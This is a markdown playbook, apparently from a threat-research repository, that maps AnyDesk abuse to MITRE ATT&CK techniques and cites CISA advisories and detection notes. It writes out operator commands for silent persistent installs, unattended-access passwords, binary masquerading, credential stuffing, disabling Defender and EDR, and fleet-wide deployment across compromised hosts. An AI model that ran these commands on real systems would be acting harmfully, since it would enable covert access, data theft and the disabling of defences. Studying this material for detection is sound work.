# AnyDesk — Hands-On Use Cases

Every scenario below expands an entry from `01 - Overview.md`'s Quick Use-Case List, with a full command sequence (Windows CLI, per the official reference) and its MITRE ATT&CK ID(s).

## Contents
- [Portable Execution to Avoid an Installed-Program Trace](#portable-execution-to-avoid-an-installed-program-trace)
- [Silent Scripted Install for Persistent Re-Entry](#silent-scripted-install-for-persistent-re-entry)
- [Configuring Unattended Access](#configuring-unattended-access)
- [Renaming the Binary to Blend In](#renaming-the-binary-to-blend-in)
- [Data Exfiltration via Built-In File Transfer](#data-exfiltration-via-built-in-file-transfer)
- [Social-Engineering Delivery — Tech Support Scam](#social-engineering-delivery--tech-support-scam)
- [Password Reuse Against an Already-Installed Enterprise Deployment](#password-reuse-against-an-already-installed-enterprise-deployment)
- [Disabling Security Tooling After Access Is Established](#disabling-security-tooling-after-access-is-established)
- [Fleet-Wide Deployment as Redundant Access](#fleet-wide-deployment-as-redundant-access)
- [Silent Uninstall After Use](#silent-uninstall-after-use)
- [Chained Workflow: Delivering a C2 Payload via File Transfer](#chained-workflow-delivering-a-c2-payload-via-file-transfer)
- [Defender's-Side Irony: AnyDesk's Own Logs as an Audit Trail](#defenders-side-irony-anydesks-own-logs-as-an-audit-trail)

---

## Portable Execution to Avoid an Installed-Program Trace

**MITRE ATT&CK:** T1219.002 (Remote Access Software: Remote Desktop Software)

```
:: Drop the standalone portable EXE and just run it — no installer step at all
AnyDesk.exe
:: The window that opens shows this instance's own AnyDesk ID immediately;
:: no service, no registry key, no Program Files entry is created (01 - Overview.md)
```

Per CISA's Akira advisory characterization, this is attractive precisely because it "requires no installation, runs from user-writable directories, and blends into administrative activity" — an operator can run it straight from a Downloads folder, a mapped share, or a USB stick with zero elevation. The tradeoff (`01 - Overview.md`'s portable-mode table): Unattended Access only works while the window stays open, and the session ends the moment it's closed — this use case suits a single hands-on-keyboard action, not durable persistence (see the next use case for that).

## Silent Scripted Install for Persistent Re-Entry

**MITRE ATT&CK:** T1219.002, T1543.003 (Create or Modify System Process: Windows Service)

```
AnyDesk.exe --install "C:\Windows\Temp\AD" --start-with-win --silent --remove-first
```

Registers the Windows service, sets it to autostart, and suppresses every UI prompt — no interactive install dialog for a defender or the logged-in user to notice. `--start-with-win` is what converts a one-off session into something surviving a reboot: per `01 - Overview.md`'s portable-vs-installed table, only the installed mode persists across reboots and user sessions at all.

## Configuring Unattended Access

**MITRE ATT&CK:** T1219.002, T1556 (Modify Authentication Process — the password/token gate being configured, not bypassed)

```
:: Piped via echo per the official CLI syntax — see 01 - Overview.md's caveat
:: that this still appears in full on the command line for Sysmon 1 to capture
echo Sup3rS3cr3tP@ss2026 | AnyDesk.exe --set-password
```

Once set, the target is reachable without a human approving each connection — the operator only needs the target's ID/Alias and this password going forward, from any AnyDesk client anywhere.

## Renaming the Binary to Blend In

**MITRE ATT&CK:** T1036.005 (Masquerading: Match Legitimate Name or Location)

```
copy AnyDesk.exe svchost_update.exe
svchost_update.exe --get-id
```

Defeats a filename- or path-based hunt at a glance, but does **not** touch the compiled PE's `OriginalFileName` metadata field — Sysmon Event ID 1 captures that field independent of the on-disk filename, so `svchost_update.exe` still reports `OriginalFileName: AnyDesk.exe` to anything parsing that field (`04 - Target Evidence.md`, `05 - Detection and Hunting.md`). It also does nothing to the Authenticode signature, which still validates as AnyDesk Software GmbH regardless of the filename chosen.

## Data Exfiltration via Built-In File Transfer

**MITRE ATT&CK:** T1041 (Exfiltration Over C2 Channel)

```
:: Launch straight into File Transfer mode against an already-configured target
AnyDesk.exe <target-id> --file-transfer
```

No separate exfil tool or protocol needed — drag-and-drop or clipboard sync inside the same authenticated session pulls files back to the operator's own machine with no documented size limit (`01 - Overview.md`). This is the exact mechanic **Mad Liberator** ransomware operators are documented using for data theft: establish the session, browse the target's file tree through AnyDesk's own File Manager, pull what's wanted, all inside traffic that — from a network-monitoring standpoint — looks identical to a legitimate support session to the same relay infrastructure.

## Social-Engineering Delivery — Tech Support Scam

**MITRE ATT&CK:** T1566.004 (Phishing: Spearphishing Voice), T1204.002 (User Execution: Malicious File)

No operator command illustrates the technical side of this one — it's an initial-access vector, not a post-foothold action. Per the FBI's own consumer alert and CISA's [AA23-025A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a) joint advisory: actors impersonate a trusted brand's help desk (Microsoft, Apple, a bank, an antivirus vendor, or — per CISA's documented case — a federal-agency refund desk), place or receive a call or push a pop-up alert, and **talk the victim into downloading and running AnyDesk themselves**, then walk them through granting session access. CISA's advisory documents this pattern specifically pairing AnyDesk with **ScreenConnect** in a bank-refund scam: the actor connects, has the victim log into their own bank account while still connected, quietly edits the displayed balance to look like an accidental overpayment, then instructs the victim to "refund" the difference. T1566.004 (Spearphishing Voice) was added to ATT&CK specifically to cover this class of vishing-to-RMM-install pattern.

## Password Reuse Against an Already-Installed Enterprise Deployment

**MITRE ATT&CK:** T1110.004 (Brute Force: Credential Stuffing), T1219.002

```
:: No new deployment step at all — connect directly to an AnyDesk ID
:: already active in the target environment, using a password
:: obtained from a prior breach/credential dump
echo <stuffed-password-candidate> | AnyDesk.exe <known-corporate-anydesk-id> --with-password
```

Relevant wherever an organization already runs AnyDesk legitimately (IT support, an MSP) and reuses (or never rotates) an Unattended Access password — no malware delivery step required at all, since the "attack" is entirely against an authentication secret on infrastructure the victim organization already trusts and runs.

## Disabling Security Tooling After Access Is Established

**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools)

```
:: Executed interactively inside an established AnyDesk session,
:: not an AnyDesk-specific command — AnyDesk is the access vector,
:: any native admin tooling is the actual mechanism
Set-MpPreference -DisableRealtimeMonitoring $true
sc.exe stop <edr-service-name>
```

Because AnyDesk grants full interactive desktop control, everything downstream (stopping EDR services, disabling Defender, deleting Volume Shadow Copies) is just an admin using their own machine — no AnyDesk-specific exploit needed, and per CISA's Akira advisory this is exactly the pattern observed: RMM access used "to mimic administrator activity" while EDR/AV is torn down.

## Fleet-Wide Deployment as Redundant Access

**MITRE ATT&CK:** T1570 (Lateral Tool Transfer), T1219.002

```
:: Copy the portable EXE and repeat the same install line across every
:: reachable compromised host (via an already-established primary access
:: method — psexec/wmiexec/RMM — not AnyDesk deploying itself)
foreach ($h in Get-Content .\hosts.txt) {
  Copy-Item .\AnyDesk.exe "\\$h\C$\Windows\Temp\AnyDesk.exe"
  Invoke-Command -ComputerName $h -ScriptBlock {
    C:\Windows\Temp\AnyDesk.exe --install "C:\Windows\Temp\AD" --start-with-win --silent
  }
}
```

Standing up AnyDesk on multiple already-compromised hosts as a **redundant/backup channel** alongside a primary implant — if the primary C2 gets burned, AnyDesk (blending in as legitimate RMM traffic) survives independently, per LockBit's documented practice of pairing AnyDesk with proxy tooling (SystemBC, ngrok) for exactly this redundancy.

## Silent Uninstall After Use

**MITRE ATT&CK:** T1070.004 (Indicator Removal: File Deletion)

```
AnyDesk.exe --remove
```

Removes the service, shortcuts, and Program Files/ProgramData install directory with no prompt — but does **not** retroactively remove events already written (Security 4688, System 7045, Sysmon) or any trace-file copies already exfiltrated/logged elsewhere before the uninstall ran (`04 - Target Evidence.md`, `05 - Detection and Hunting.md`'s Hunting Priority table).

## Chained Workflow: Delivering a C2 Payload via File Transfer

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer)

```
:: Inside an established AnyDesk session, in File Transfer mode:
:: drag the payload from the operator's machine onto the target's
:: file tree, then execute it interactively from the same session
AnyDesk.exe <target-id> --file-transfer
```

A common real-world chain: use AnyDesk purely as the delivery/hands-on channel to drop a more capable implant (a Cobalt Strike Beacon, a Sliver implant — both already covered in this repo's `Cobalt Strike/` and `Sliver/` folders), then let that implant carry the rest of the intrusion while AnyDesk itself is uninstalled or left dormant as a fallback channel.

## Defender's-Side Irony: AnyDesk's Own Logs as an Audit Trail

**No discrete MITRE ATT&CK ID** — this is a defensive observation, not an operator technique.

AnyDesk's own trace files (`ad.trace`, `connection_trace.txt`, `file_transfer_trace.txt` — full detail in `04 - Target Evidence.md`) are written by the client regardless of whether the person running it is legitimate IT staff or an intruder. An operator who doesn't clean these up (or who runs `--remove` without also touching the trace-file directories, which the uninstall does not delete) leaves a fairly complete, timestamped record of exactly what they did on the very host they compromised — the same verbosity that makes AnyDesk pleasant for legitimate remote support works directly against an operator who isn't thinking about forensic hygiene.
